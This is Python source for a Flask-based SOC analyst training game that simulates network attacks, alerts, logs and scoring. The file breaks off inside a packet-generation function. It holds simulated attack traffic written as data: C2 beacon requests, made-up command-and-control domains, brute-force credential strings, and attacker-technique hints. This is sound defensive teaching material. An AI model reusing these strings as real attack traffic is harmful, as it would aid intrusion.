"""
HomeSIEM v3 - Full-featured SOC Training Platform
pip install flask requests
"""
import threading, time, json, random, struct, os, io, re
from datetime import datetime, timedelta
from collections import defaultdict, deque
from flask import Flask, jsonify, request, send_file
import logging

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
logging.getLogger('werkzeug').setLevel(logging.ERROR)
app = Flask(__name__)

# ══════════════════════════════════════════════════════════════════════════════
# GLOBAL STATE
# ══════════════════════════════════════════════════════════════════════════════
alerts        = deque(maxlen=500)
events        = deque(maxlen=2000)
alert_packets = {}
sim_logs      = deque(maxlen=1000)   # simulated log lines

traffic_stats = {"total_packets":0,"bytes_in":0,"protocols":defaultdict(int),"top_talkers":defaultdict(int)}
threat_intel  = {"blocked_ips":set(),"watchlist":set()}

alert_id_counter = [0]
siem_start_time  = datetime.now()

# ══════════════════════════════════════════════════════════════════════════════
# DIFFICULTY
# ══════════════════════════════════════════════════════════════════════════════
difficulty_state = {"level": "normal"}  # easy | normal | hard

DIFFICULTY_CONFIG = {
    "easy":   {"hints_free":True,  "show_attack_type":True,  "xp_mult":0.75, "false_positive_rate":0.05, "label":"Easy",   "color":"var(--low)"},
    "normal": {"hints_free":False, "show_attack_type":True,  "xp_mult":1.0,  "false_positive_rate":0.15, "label":"Normal", "color":"var(--accent)"},
    "hard":   {"hints_free":False, "show_attack_type":False, "xp_mult":1.5,  "false_positive_rate":0.25, "label":"Hard",   "color":"var(--critical)"},
}

# ══════════════════════════════════════════════════════════════════════════════
# NETWORK TOPOLOGY
# ══════════════════════════════════════════════════════════════════════════════
NETWORK_HOSTS = {
    "192.168.1.1":  {"name":"Gateway/Router",    "role":"gateway",    "os":"Cisco IOS",        "services":["DNS","DHCP","NAT"], "icon":"🌐", "x":400,"y":60},
    "192.168.1.10": {"name":"Web Server",         "role":"server",     "os":"Ubuntu 22.04",     "services":["HTTP","HTTPS","SSH"],"icon":"🖥","x":180,"y":180},
    "192.168.1.20": {"name":"File Server",        "role":"server",     "os":"Windows Server",   "services":["SMB","RDP","NFS"],  "icon":"💾","x":400,"y":180},
    "192.168.1.30": {"name":"Workstation Alpha",  "role":"workstation","os":"Windows 11",       "services":["RDP"],             "icon":"💻","x":200,"y":300},
    "192.168.1.40": {"name":"Workstation Beta",   "role":"workstation","os":"Windows 11",       "services":["RDP"],             "icon":"💻","x":380,"y":300},
    "192.168.1.50": {"name":"Dev Machine",        "role":"workstation","os":"macOS 14",         "services":["SSH","HTTP"],      "icon":"🍎","x":560,"y":300},
    "192.168.1.60": {"name":"SIEM / Logger",      "role":"security",   "os":"Ubuntu 22.04",     "services":["Syslog","HTTPS"],  "icon":"🛡","x":620,"y":180},
    "192.168.1.100":{"name":"Print Server",       "role":"server",     "os":"Windows Server",   "services":["LPD","SMB"],       "icon":"🖨","x":600,"y":60},
}

host_alerts  = defaultdict(list)   # ip -> list of alert ids
host_traffic = defaultdict(int)    # ip -> packet count

# ══════════════════════════════════════════════════════════════════════════════
# WAR ROOM
# ══════════════════════════════════════════════════════════════════════════════
war_room = {
    "active":       False,
    "scenario":     None,
    "start_time":   None,
    "duration_sec": 300,
    "alerts_to_clear": [],
    "cleared":      [],
    "failed":       [],
    "score":        0,
    "complete":     False,
    "result":       None,
}

WAR_ROOM_SCENARIOS = [
    {
        "id":"wrs1","name":"Under Siege",
        "description":"Your network is under a coordinated multi-vector attack. You have 5 minutes to identify and contain all threats.",
        "duration":300,"attacks":["port_scan","brute_force","c2_beacon","data_exfil"],
        "required_clears":4,"sla_xp":500,"difficulty_required":None,
    },
    {
        "id":"wrs2","name":"Ransomware Outbreak",
        "description":"Ransomware is staging across your network. Identify lateral movement and the initial access vector before encryption begins.",
        "duration":240,"attacks":["ransomware","lateral_movement","port_scan"],
        "required_clears":3,"sla_xp":700,"difficulty_required":"normal",
    },
    {
        "id":"wrs3","name":"APT Intrusion",
        "description":"A sophisticated threat actor is conducting a stealthy campaign. High false-positive rate — don't waste time on noise.",
        "duration":360,"attacks":["dns_tunnel","c2_beacon","data_exfil","lateral_movement"],
        "required_clears":4,"sla_xp":1000,"difficulty_required":"hard",
    },
]

# ══════════════════════════════════════════════════════════════════════════════
# MISSIONS / CAMPAIGNS
# ══════════════════════════════════════════════════════════════════════════════
analyst_session = {
    "correct":0,"incorrect":0,"partial":0,"total_scored":0,
    "xp":0,"level":1,"streak":0,"best_streak":0,"actions_log":[],
    "missions_completed":[],
    "campaign_progress":{},
}

XP_TABLE      = {"correct":100,"partial":40,"incorrect":-20}
LEVEL_THRESHOLDS = [0,200,500,900,1400,2100,3000,4200,5800,8000,11000]
LEVEL_NAMES   = ["Trainee","Junior Analyst","Analyst","Senior Analyst","Lead Analyst",
                 "Threat Hunter","Incident Responder","SOC Manager","CISO","Security Architect","Elite Defender"]

MISSIONS = [
    # Beginner campaign
    {"id":"M001","campaign":"Beginner","order":1,"name":"First Contact",
     "description":"Investigate your first alert. Any alert counts — just open it and mark a status.",
     "objective":"Respond to 1 alert","xp_reward":150,
     "condition":{"type":"total_scored","target":1}},
    {"id":"M002","campaign":"Beginner","order":2,"name":"Network Recon 101",
     "description":"A port scan is the first thing attackers do. Learn to recognize and respond to reconnaissance.",
     "objective":"Correctly resolve a Port Scan alert","xp_reward":250,
     "condition":{"type":"correct_type","attack_type":"port_scan","target":1}},
    {"id":"M003","campaign":"Beginner","order":3,"name":"Credential Defense",
     "description":"Brute force attacks are common and dangerous. Identify and stop one.",
     "objective":"Correctly resolve a Brute Force alert","xp_reward":300,
     "condition":{"type":"correct_type","attack_type":"brute_force","target":1}},
    {"id":"M004","campaign":"Beginner","order":4,"name":"Block Party",
     "description":"Build your threat intel. Block 3 source IPs from alerts.",
     "objective":"Block 3 IPs from alert responses","xp_reward":200,
     "condition":{"type":"blocked_ips","target":3}},
    {"id":"M005","campaign":"Beginner","order":5,"name":"Five in a Row",
     "description":"Consistency matters. Achieve a 5-alert correct streak.",
     "objective":"Get 5 correct answers in a row","xp_reward":500,
     "condition":{"type":"streak","target":5}},
    # Intermediate campaign
    {"id":"M101","campaign":"Intermediate","order":1,"name":"C2 Hunter",
     "description":"Command and control traffic is subtle. Learn to spot the beacons.",
     "objective":"Correctly resolve 2 C2 Beacon alerts","xp_reward":350,
     "condition":{"type":"correct_type","attack_type":"c2_beacon","target":2}},
    {"id":"M102","campaign":"Intermediate","order":2,"name":"Data Guardian",
     "description":"Prevent exfiltration. Identify and stop 2 data theft attempts.",
     "objective":"Correctly resolve 2 Data Exfil alerts","xp_reward":400,
     "condition":{"type":"correct_type","attack_type":"data_exfil","target":2}},
    {"id":"M103","campaign":"Intermediate","order":3,"name":"False Alarm",
     "description":"Not everything is a threat. Correctly identify 2 false positives without penalising real threats.",
     "objective":"Correctly mark 2 false positives","xp_reward":450,
     "condition":{"type":"correct_fp","target":2}},
    {"id":"M104","campaign":"Intermediate","order":4,"name":"Threat Hunter",
     "description":"Advanced threats use DNS and tunneling. Learn the new attack vectors.",
     "objective":"Correctly resolve a DNS Tunneling alert","xp_reward":500,
     "condition":{"type":"correct_type","attack_type":"dns_tunnel","target":1}},
    {"id":"M105","campaign":"Intermediate","order":5,"name":"10-Alert Sprint",
     "description":"Speed and accuracy — correctly resolve 10 alerts total.",
     "objective":"10 total correct resolutions","xp_reward":750,
     "condition":{"type":"total_correct","target":10}},
    # Advanced campaign
    {"id":"M201","campaign":"Advanced","order":1,"name":"Ransomware Response",
     "description":"Ransomware staging is a race against time. Identify all stages of the kill chain.",
     "objective":"Correctly handle a Ransomware Staging alert","xp_reward":600,
     "condition":{"type":"correct_type","attack_type":"ransomware","target":1}},
    {"id":"M202","campaign":"Advanced","order":2,"name":"Lateral Movement",
     "description":"After initial access, attackers pivot internally. Detect it.",
     "objective":"Correctly resolve a Lateral Movement alert","xp_reward":600,
     "condition":{"type":"correct_type","attack_type":"lateral_movement","target":1}},
    {"id":"M203","campaign":"Advanced","order":3,"name":"Accuracy Matters",
     "description":"At senior level, false positives cost as much as misses. Reach 80% accuracy.",
     "objective":"Achieve 80% accuracy over 10+ alerts","xp_reward":800,
     "condition":{"type":"accuracy","target":80,"min_scored":10}},
    {"id":"M204","campaign":"Advanced","order":4,"name":"War Room Ready",
     "description":"Complete your first War Room scenario to prove you can handle pressure.",
     "objective":"Complete any War Room scenario","xp_reward":1000,
     "condition":{"type":"war_room","target":1}},
    {"id":"M205","campaign":"Advanced","order":5,"name":"Elite Status",
     "description":"Reach Level 7 (Incident Responder) to prove mastery.",
     "objective":"Reach Level 7","xp_reward":2000,
     "condition":{"type":"level","target":7}},
]

def check_missions():
    """Check all incomplete missions and mark any newly completed ones."""
    newly_completed = []
    completed_ids   = analyst_session["missions_completed"]

    for m in MISSIONS:
        if m["id"] in completed_ids:
            continue
        cond = m["condition"]
        met  = False

        if cond["type"] == "total_scored":
            met = analyst_session["total_scored"] >= cond["target"]
        elif cond["type"] == "correct_type":
            count = sum(1 for a in analyst_session["actions_log"]
                        if a.get("verdict")=="correct" and a.get("attack_type")==cond["attack_type"])
            met = count >= cond["target"]
        elif cond["type"] == "correct_fp":
            count = sum(1 for a in analyst_session["actions_log"]
                        if a.get("verdict")=="correct" and a.get("action")=="false_positive")
            met = count >= cond["target"]
        elif cond["type"] == "total_correct":
            met = analyst_session["correct"] >= cond["target"]
        elif cond["type"] == "streak":
            met = analyst_session["best_streak"] >= cond["target"]
        elif cond["type"] == "blocked_ips":
            met = len(threat_intel["blocked_ips"]) >= cond["target"]
        elif cond["type"] == "accuracy":
            scored = analyst_session["total_scored"]
            if scored >= cond.get("min_scored", 1):
                acc = analyst_session["correct"] / max(1, scored) * 100
                met = acc >= cond["target"]
        elif cond["type"] == "war_room":
            met = analyst_session.get("war_rooms_completed", 0) >= cond["target"]
        elif cond["type"] == "level":
            met = analyst_session["level"] >= cond["target"]

        if met:
            completed_ids.append(m["id"])
            analyst_session["xp"] += m["xp_reward"]
            newly_completed.append(m)
            # Update campaign progress
            cp = analyst_session["campaign_progress"]
            cp[m["campaign"]] = cp.get(m["campaign"], 0) + 1

    return newly_completed

def record_action(alert_id, action, verdict, xp_gained, attack_type="normal"):
    diff = difficulty_state["level"]
    mult = DIFFICULTY_CONFIG[diff]["xp_mult"]
    adjusted_xp = int(xp_gained * mult)

    analyst_session["total_scored"] += 1
    analyst_session["xp"] = max(0, analyst_session["xp"] + adjusted_xp)
    analyst_session[verdict] = analyst_session.get(verdict, 0) + 1

    if verdict == "correct":
        analyst_session["streak"] += 1
        analyst_session["best_streak"] = max(analyst_session["streak"], analyst_session["best_streak"])
        if analyst_session["streak"] % 3 == 0:
            analyst_session["xp"] += 50
    else:
        analyst_session["streak"] = 0

    xp = analyst_session["xp"]
    for lvl, threshold in enumerate(LEVEL_THRESHOLDS):
        if xp >= threshold:
            analyst_session["level"] = lvl + 1

    analyst_session["actions_log"].append({
        "alert_id":alert_id,"action":action,"verdict":verdict,
        "xp":adjusted_xp,"ts":datetime.now().isoformat(),"attack_type":attack_type,
    })
    return adjusted_xp

# ══════════════════════════════════════════════════════════════════════════════
# LOG GENERATOR
# ══════════════════════════════════════════════════════════════════════════════

LOG_TEMPLATES = {
    "port_scan": [
        "WARN  {ts} kernel: iptables: IN=eth0 SRC={src} DST=192.168.1.1 PROTO=TCP DPT={port} SYN",
        "WARN  {ts} sshd[1234]: Connection from {src} port {sport} on 192.168.1.1 port 22",
        "INFO  {ts} snort[2100]: [1:1000001:1] SCAN nmap SYN {src} -> 192.168.1.1:{port}",
    ],
    "brute_force": [
        "WARN  {ts} sshd[1234]: Failed password for {user} from {src} port {sport} ssh2",
        "WARN  {ts} sshd[1234]: Invalid user {user} from {src} port {sport}",
        "ERROR {ts} sshd[1234]: PAM: Authentication failure for {user} from {src}",
        "WARN  {ts} auth: pam_unix(sshd:auth): authentication failure; logname= uid=0 user={user} rhost={src}",
    ],
    "c2_beacon": [
        "WARN  {ts} suricata: MALWARE-CNC Win.Trojan beacon outbound traffic {src} -> {dst}:{port}",
        "INFO  {ts} firewall: ALLOW TCP {src}:{sport} -> {dst}:{port} len=348 ttl=128",
        "WARN  {ts} proxy: CONNECT {dst}:{port} HTTP/1.1 User-Agent: Go-http-client/1.1 (SUSPICIOUS)",
    ],
    "data_exfil": [
        "WARN  {ts} proxy: Large HTTPS upload: {src} -> {dst} bytes={size} duration=42s",
        "INFO  {ts} firewall: ALLOW TCP {src}:{sport} -> {dst}:443 len={size}",
        "WARN  {ts} dlp: Data Loss Prevention: Large file transfer detected from {src}",
        "WARN  {ts} suricata: ET POLICY Outbound Large Data Transfer {src} -> {dst}",
    ],
    "dns_tunnel": [
        "WARN  {ts} named[789]: DNS query from {src}: {subdomain}.{domain} TXT (suspicious encoding)",
        "WARN  {ts} suricata: ET DNS DNS Tunneling via {domain} query from {src}",
        "INFO  {ts} resolver: QUERY {src} -> {domain} type=TXT len=255 (anomalous)",
        "WARN  {ts} bind: excessive TXT queries from {src}: {count}/min threshold exceeded",
    ],
    "arp_spoof": [
        "WARN  {ts} arpwatch: flip flop {victim} {mac1} and {mac2}",
        "WARN  {ts} kernel: neighbour table overflow! ARP flood from {src}",
        "ERROR {ts} arpwatch: new activity {src} {mac1} (previously {mac2})",
    ],
    "ransomware": [
        "ERROR {ts} samba[9123]: Rapid file rename activity from {src}: 1247 files in 30s",
        "ERROR {ts} kernel: inotify: mass file modification on /shared from {src}",
        "WARN  {ts} av: Suspicious file activity: .encrypted extension mass creation by PID {pid}",
        "ERROR {ts} backup: VSS Shadow Copy deletion attempt from PID {pid}",
    ],
    "lateral_movement": [
        "WARN  {ts} winlogon: Logon Type 3 (Network) from {src} to {dst} user={user}",
        "WARN  {ts} smb: Authentication attempt from {src} to {dst} using pass-the-hash",
        "INFO  {ts} security: Account {user} logged in from new source {src} (first seen)",
        "WARN  {ts} sysmon: CreateRemoteThread detected: {src} -> {dst} PID={pid}",
    ],
    "priv_escalation": [
        "ERROR {ts} sudo[4521]: COMMAND NOT ALLOWED ; USER={user} ; COMMAND=/bin/bash",
        "WARN  {ts} kernel: audit: uid={uid} auid={auid} ses=1 exe=/usr/bin/sudo key=privilege_escalation",
        "ERROR {ts} auth: su: FAILED SU (to root) {user} on /dev/pts/1",
        "WARN  {ts} sysmon: Privilege escalation via token impersonation PID={pid} user={user}",
    ],
    "normal": [
        "INFO  {ts} sshd[1234]: Accepted publickey for deploy from 192.168.1.50 port {sport}",
        "INFO  {ts} nginx: 192.168.1.30 - GET /api/health HTTP/1.1 200",
        "INFO  {ts} cron[3456]: (root) CMD (/usr/bin/backup.sh)",
        "INFO  {ts} systemd: Started Daily Cleanup.",
    ],
}

def generate_log_line(attack_type, event):
    templates = LOG_TEMPLATES.get(attack_type, LOG_TEMPLATES["normal"])
    tmpl = random.choice(templates)
    ts   = datetime.now().strftime("%b %d %H:%M:%S")
    src  = event.get("src_ip","10.0.0.1")
    dst  = event.get("dst_ip","192.168.1.10")
    port = event.get("dst_port", 80)
    sport= event.get("src_port", make_src_port())
    user = random.choice(["admin","root","user","svc_backup","john.doe"])
    size = event.get("bytes", 1024)
    subdomains = ["aGVsbG8","d29ybGQ","dGVzdA","YWJjZGVm","eHh4eHg"]
    domains    = ["evil-c2.ru","update-svc.cn","cdn-fast.nl","telemetry-eu.io"]

    line = tmpl.format(
        ts=ts, src=src, dst=dst, port=port, sport=sport,
        user=user, size=size, pid=random.randint(1000,9999),
        uid=random.randint(1000,9999), auid=random.randint(1000,9999),
        mac1=make_mac(), mac2=make_mac(), victim=dst,
        subdomain=random.choice(subdomains), domain=random.choice(domains),
        count=random.randint(80,200),
    )
    return {
        "id":    len(sim_logs),
        "ts":    datetime.now().isoformat(),
        "level": "WARN" if "WARN" in line else "ERROR" if "ERROR" in line else "INFO",
        "source":attack_type,
        "line":  line,
        "src_ip":src,
    }

def add_logs_for_event(event, attack_type, count=3):
    for _ in range(count):
        sim_logs.appendleft(generate_log_line(attack_type, event))

# ══════════════════════════════════════════════════════════════════════════════
# EVALUATION ENGINE
# ══════════════════════════════════════════════════════════════════════════════

EVALUATION_RULES = {
    "port_scan":   {"correct":{"resolved"},"partial":{"investigating"},"wrong":{"false_positive"},
     "correct_fb":"✅ Correct. Port scans are active reconnaissance. Resolving and blocking is the right call.",
     "partial_fb":"⚠️ Partially correct. Investigating is valid but a confirmed port scan should be blocked.",
     "wrong_fb":  "❌ Incorrect. This was real reconnaissance. External hosts probing dozens of ports are always suspicious.",
     "tip":"Port scans precede almost every successful attack. Block the source and watch for follow-up connection attempts.",
     "indicators":["Multiple SYN packets to sequential ports","No SYN-ACK responses","Scanning tool TTL signature"],"block":True},
    "brute_force": {"correct":{"resolved"},"partial":{"investigating"},"wrong":{"false_positive"},
     "correct_fb":"✅ Correct. 5+ failures in 5 minutes is unambiguous credential stuffing. Good response.",
     "partial_fb":"⚠️ Partially correct. This is a clear brute force — resolve and block, don't just investigate.",
     "wrong_fb":  "❌ Incorrect. Five auth failures from the same external IP within minutes is never legitimate.",
     "tip":"After brute force, check if any attempt succeeded. A success immediately after failures = confirmed compromise.",
     "indicators":["Repeated auth failures from single source","Sequential usernames","Consistent timing interval"],"block":True},
    "c2_beacon":   {"correct":{"resolved"},"partial":{"investigating"},"wrong":{"false_positive"},
     "correct_fb":"✅ Correct. Port 4444/6667 beacons are a serious IOC. The affected host needs quarantine.",
     "partial_fb":"⚠️ Partially correct. Investigating C2 is valid, but ultimately the host must be isolated.",
     "wrong_fb":  "❌ Incorrect. Internal hosts beaconing to port 4444 or 6667 externally is a malware indicator.",
     "tip":"C2 beacons have regular timing. Isolate the host immediately and forensically image it. Assume full compromise.",
     "indicators":["Internal host initiating to suspicious port","Regular beacon timing","Small consistent payloads"],"block":True},
    "data_exfil":  {"correct":{"resolved"},"partial":{"investigating"},"wrong":{"false_positive"},
     "correct_fb":"✅ Correct. A 10MB+ single transfer to an unknown external IP is high-confidence exfiltration.",
     "partial_fb":"⚠️ Partially correct. Investigating is valid but a transfer this size to an unknown IP must be resolved.",
     "wrong_fb":  "❌ Incorrect. A 10–50MB outbound transfer to an unknown host should never be dismissed.",
     "tip":"Determine what data was transferred by correlating with file access logs. Check destination IP reputation.",
     "indicators":["Large single-session transfer","Unknown destination","Unusual time of day","High entropy payload"],"block":True},
    "blocked_ip":  {"correct":{"resolved"},"partial":{"investigating"},"wrong":{"false_positive"},
     "correct_fb":"✅ Correct. A blocked IP attempting re-entry confirms your threat intel is working.",
     "partial_fb":"⚠️ Partially correct. Known-bad IPs warrant zero tolerance — resolve immediately.",
     "wrong_fb":  "❌ Incorrect. This IP was blocked for a reason. Don't dismiss contact attempts from known-bad hosts.",
     "tip":"Persistent contact from blocked IPs may indicate a targeted attack or automated infrastructure rotation.",
     "indicators":["IP matches block list","Repeated contact attempts","No legitimate business relationship"],"block":False},
    "dns_tunnel":  {"correct":{"resolved"},"partial":{"investigating"},"wrong":{"false_positive"},
     "correct_fb":"✅ Correct. DNS tunneling is a stealthy exfiltration/C2 technique. Good catch.",
     "partial_fb":"⚠️ Partially correct. DNS tunneling is an active threat — don't just investigate, resolve and block.",
     "wrong_fb":  "❌ Incorrect. High-entropy TXT queries with base64-like subdomains are a DNS tunneling signature.",
     "tip":"DNS tunneling uses TXT records to bypass firewalls. Check for base64-encoded subdomains and excessive query volume.",
     "indicators":["High-entropy subdomain labels","Excessive TXT queries","Single domain receiving many queries","Unusual query lengths"],"block":True},
    "arp_spoof":   {"correct":{"resolved"},"partial":{"investigating"},"wrong":{"false_positive"},
     "correct_fb":"✅ Correct. ARP spoofing is a man-in-the-middle precursor. You stopped it before it escalated.",
     "partial_fb":"⚠️ Partially correct. ARP spoofing needs immediate containment — it enables full traffic interception.",
     "wrong_fb":  "❌ Incorrect. MAC address flipping on the same IP is a clear ARP spoofing indicator.",
     "tip":"ARP spoofing enables MitM attacks on your LAN. Enable dynamic ARP inspection (DAI) on your switches.",
     "indicators":["MAC address change for existing IP","ARP reply without request","Duplicate IP/MAC mappings"],"block":True},
    "ransomware":  {"correct":{"resolved"},"partial":{"investigating"},"wrong":{"false_positive"},
     "correct_fb":"✅ Correct. Ransomware staging caught early. Isolate the host before encryption completes.",
     "partial_fb":"⚠️ Partially correct. Ransomware is time-critical — every second of investigation is encryption time.",
     "wrong_fb":  "❌ Incorrect. Mass file renaming and shadow copy deletion are ransomware kill chain indicators.",
     "tip":"Ransomware typically deletes VSS backups first, then encrypts. Network isolation is the only containment.",
     "indicators":["Mass file rename/modification","VSS deletion attempt","Encryption extension pattern",".ransom files created"],"block":True},
    "lateral_movement":{"correct":{"resolved"},"partial":{"investigating"},"wrong":{"false_positive"},
     "correct_fb":"✅ Correct. Lateral movement caught. Trace the initial access vector and contain all affected hosts.",
     "partial_fb":"⚠️ Partially correct. Lateral movement needs full investigation of all affected hosts.",
     "wrong_fb":  "❌ Incorrect. Pass-the-hash from a workstation to a server is classic post-compromise lateral movement.",
     "tip":"Map all hosts the attacker touched. Lateral movement leaves traces in Windows Event Log (4624, 4648, 4776).",
     "indicators":["Logon Type 3 from unexpected source","Pass-the-hash signature","First-seen source IP","Admin share access"],"block":True},
    "priv_escalation":{"correct":{"resolved"},"partial":{"investigating"},"wrong":{"false_positive"},
     "correct_fb":"✅ Correct. Privilege escalation caught. Change credentials for affected accounts immediately.",
     "partial_fb":"⚠️ Partially correct. PrivEsc needs immediate resolution — the attacker may already have root.",
     "wrong_fb":  "❌ Incorrect. Failed sudo attempts and token impersonation are clear privilege escalation indicators.",
     "tip":"After PrivEsc, assume the attacker has persistence. Check for new user accounts, cron jobs, and SSH keys.",
     "indicators":["Sudo failure spike","Token impersonation","SUID binary execution","Unusual setuid calls"],"block":True},
    "false_positive_normal":{"correct":{"false_positive"},"partial":{"investigating","resolved"},"wrong":set(),
     "correct_fb":"✅ Correct — false positive. Further investigation confirms this is a legitimate scheduled task or known-good host. Marking as false positive is the right call.",
     "partial_fb":"⚠️ Partially correct. Investigating is reasonable, but after reviewing context this was benign traffic. Mark as false positive to keep your queue clean.",
     "wrong_fb":  "No penalty — this was a false positive trap. Practice recognising benign traffic patterns to avoid alert fatigue.",
     "tip":"False positives waste analyst time and cause alert fatigue. Build a traffic baseline so you can quickly spot what's normal for your network.",
     "indicators":[],"block":False},
}

HINTS = {
    "port_scan":["Look at how many unique destination ports were hit in a short window.",
                 "All SYN packets with no SYN-ACK — the scanner is mapping open ports.",
                 "External hosts probing dozens of ports in seconds is always suspicious.",
                 "Recommended: Resolve and block. This is pre-attack reconnaissance."],
    "brute_force":["Count the failures — 5+ from one IP in 5 minutes is beyond any user.",
                   "Look at the usernames: admin, root, administrator = dictionary attack.",
                   "Check the timeline for a successful auth after the failures.",
                   "Recommended: Resolve, block source IP, verify no login succeeded."],
    "c2_beacon":["Port 4444 = Metasploit. Port 6667 = IRC C2. Both are malware indicators.",
                 "This is OUTBOUND from an internal host — your machine is calling an attacker.",
                 "Regular timing between packets = automated malware beacon schedule.",
                 "Recommended: Resolve, block destination, isolate internal host."],
    "data_exfil":["A 10MB+ single transfer to an unknown external IP is far above normal.",
                  "The destination has no prior communication history — suspicious.",
                  "Check payload entropy — high entropy suggests encrypted/compressed data.",
                  "Recommended: Resolve, block destination, determine what data left."],
    "blocked_ip":["This IP is already on your block list — it was flagged as malicious.",
                  "It's still trying to connect, suggesting a persistent threat.",
                  "Highest-confidence alert type — a known-bad IP attempting ingress.",
                  "Recommended: Resolve immediately. The block is already in place."],
    "dns_tunnel":["Look at the subdomain labels — are they base64-encoded strings?",
                  "Legitimate DNS rarely uses TXT records this frequently.",
                  "The query volume to a single domain is far above normal.",
                  "Recommended: Resolve, block the domain, investigate the source host."],
    "arp_spoof":["A host's MAC address changed for the same IP — classic ARP spoofing.",
                 "The attacker is trying to intercept traffic between two hosts.",
                 "Check which hosts are affected — this could enable a full MitM.",
                 "Recommended: Resolve, isolate the spoofing host, enable DAI."],
    "ransomware":["Mass file renaming in seconds is the ransomware encryption phase.",
                  "Shadow copy deletion means backups are being destroyed first.",
                  "Once encryption starts, isolation is the ONLY containment option.",
                  "Recommended: IMMEDIATELY isolate the host. Every second matters."],
    "lateral_movement":["A workstation authenticating to a server via SMB is suspicious.",
                        "Pass-the-hash means the attacker stole credential hashes.",
                        "Check how many hosts the source has accessed — map the spread.",
                        "Recommended: Resolve, trace origin, isolate all affected hosts."],
    "priv_escalation":["Multiple sudo failures mean someone is trying to become root.",
                       "Token impersonation is a Windows technique for privilege escalation.",
                       "After PrivEsc, assume persistence was established.",
                       "Recommended: Resolve, revoke credentials, audit for new accounts."],
}

def evaluate_action(alert, action):
    attack_type = alert.get("attack_type","normal")
    is_fp_trap  = alert.get("is_false_positive_trap", False)
    if is_fp_trap:
        rules = EVALUATION_RULES["false_positive_normal"]
    else:
        rules = EVALUATION_RULES.get(attack_type, EVALUATION_RULES.get("false_positive_normal"))

    if action in rules["correct"]:
        verdict="correct"; feedback=rules["correct_fb"]; xp=XP_TABLE["correct"]
        if rules.get("block") and alert.get("src_ip") in threat_intel["blocked_ips"]:
            xp+=50; feedback+=" +50 XP bonus for blocking the source IP!"
    elif action in rules["partial"]:
        verdict="partial"; feedback=rules["partial_fb"]; xp=XP_TABLE["partial"]
    else:
        verdict="incorrect"; feedback=rules["wrong_fb"]; xp=XP_TABLE["incorrect"]

    streak=analyst_session["streak"]
    if verdict=="correct" and (streak+1)%3==0 and streak>0:
        feedback+=f" 🔥 {streak+1}-alert streak bonus! +50 XP"

    return {"verdict":verdict,"feedback":feedback,"tip":rules["tip"],
            "key_indicators":rules["indicators"],"xp":xp,"should_block":rules["block"],
            "level_before":analyst_session["level"]}

# ══════════════════════════════════════════════════════════════════════════════
# PACKET DETAIL + PCAP (condensed from v2)
# ══════════════════════════════════════════════════════════════════════════════

TCP_FLAGS_MAP={"SYN":0x002,"SYN-ACK":0x012,"ACK":0x010,"FIN":0x001,"RST":0x004,"PSH-ACK":0x018,"URG":0x020}
PROTOCOL_NUMBERS={"TCP":6,"UDP":17,"ICMP":1,"HTTPS":6,"HTTP":6,"DNS":17}
OS_FPS=[{"os":"Windows 10/11","ttl":128,"window":65535,"df":True},{"os":"Windows Server","ttl":128,"window":8192,"df":True},{"os":"Linux (Ubuntu)","ttl":64,"window":29200,"df":True},{"os":"Linux (Kali)","ttl":64,"window":65535,"df":True},{"os":"macOS","ttl":64,"window":65535,"df":True},{"os":"Unknown/Spoofed","ttl":1,"window":1024,"df":False}]
PAYLOADS={"port_scan":["","OPTIONS * HTTP/1.0\r\n\r\n"],"brute_force":["SSH-2.0-OpenSSH_7.9\r\n","USER admin\r\nPASS password123\r\n"],"c2_beacon":["GET /gate.php?id=BOT_{id}&os=Win10 HTTP/1.1\r\nHost:{host}\r\n\r\n","\\xde\\xad\\xbe\\xef (C2 beacon)"],"data_exfil":["POST /upload HTTP/1.1\r\nContent-Length:{size}\r\n\r\n"],"dns_tunnel":["DNS TXT {sub}.{host} (base64 payload)"],"arp_spoof":["ARP Reply: {host} is at {mac} (SPOOFED)"],"ransomware":["SMB: Mass RENAME *.docx -> *.encrypted"],"lateral_movement":["SMB NTLMSSP Auth (pass-the-hash) to {host}"],"priv_escalation":["sudo: FAILED /bin/bash by {id}"],"normal":["GET / HTTP/1.1\r\nHost:{host}\r\n","DNS Query: A {host}"]}

def make_src_port(): return random.randint(49152,65535)
def make_mac():
    p=random.choice(["00:50:56","AC:DE:48","08:00:27","52:54:00"])
    return p+":"+":".join(f"{random.randint(0,255):02X}" for _ in range(3))
def make_checksum(): return f"0x{random.randint(0x1000,0xFFFF):04X}"

def hex_dump_lines(s,n=48):
    raw=[ord(c) if ord(c)<128 else random.randint(0x80,0xFF) for c in s[:n]]
    while len(raw)<n: raw.append(random.randint(0,255))
    return [f"{i:04x}   "+" ".join(f"{b:02x}" for b in raw[i:i+16])+f"   "+"".join(chr(b) if 32<=b<127 else "." for b in raw[i:i+16]) for i in range(0,len(raw),16)]

def generate_packet_details(event,attack_type="normal"):
    proto=event.get("protocol","TCP"); src_ip=event.get("src_ip","0.0.0.0"); dst_ip=event.get("dst_ip","0.0.0.0")
    dst_port=event.get("dst_port",80); src_port=event.get("src_port",make_src_port()); size=event.get("bytes",random.randint(60,1500))
    os_fp=random.choice(OS_FPS)
    raw=random.choice(PAYLOADS.get(attack_type,PAYLOADS["normal"])).format(id=random.randint(1000,9999),host=dst_ip,size=size,sub="aGVsbG8",mac=make_mac())
    flags_str=event.get("flags","PSH-ACK"); flags_val=TCP_FLAGS_MAP.get(flags_str,0x018)
    proto_num=PROTOCOL_NUMBERS.get(proto,6); ip_id=random.randint(1000,65000)
    seq=random.randint(1_000_000,3_000_000_000); ack=seq+random.randint(1,500)
